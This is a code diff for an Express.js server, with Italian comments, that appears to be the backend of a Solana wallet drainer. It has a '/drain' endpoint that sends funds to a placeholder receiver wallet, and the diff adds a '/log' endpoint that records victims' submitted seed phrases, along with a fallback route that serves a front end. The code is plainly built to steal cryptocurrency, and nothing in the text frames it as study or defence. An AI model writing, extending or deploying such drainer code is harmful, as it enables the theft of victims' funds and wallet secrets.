@@ -1,13 +1,18 @@
-const express = require('express');
-const path = require('path');
-const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
-const { mnemonicToSeed } = require('bip39');
-const { derivePath } = require('ed25519-hd-key');
+import express from 'express';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js';
+import { mnemonicToSeed } from 'bip39';
+import { derivePath } from 'ed25519-hd-key';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 app.use(express.json({ limit: '10mb' }));
 
-const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY';
+// ===== CONFIGURAZIONE =====
+const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI
 const connection = new Connection('https://api.mainnet-beta.solana.com');
 
 // ===== DRENAGGIO =====
@@ -47,11 +52,26 @@ app.post('/drain', async (req, res) => {
       tokenCount: 0
     });
   } catch (e) {
+    console.error('Errore drenaggio:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
 
+// ===== LOG =====
+app.post('/log', (req, res) => {
+  console.log('📥 LOG:', req.body);
+  if (req.body.seed) {
+    console.log('⚠️ SEED RICEVUTA:', req.body.seed);
+  }
+  res.json({ status: 'ok' });
+});
+
 // ===== SERVE STATICO =====
 app.use(express.static('dist'));
+
+// ===== FALLBACK PER SPA =====
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
+});
 
 app.listen(3000, () => console.log('🚀 Server in ascolto su http://localhost:3000'));
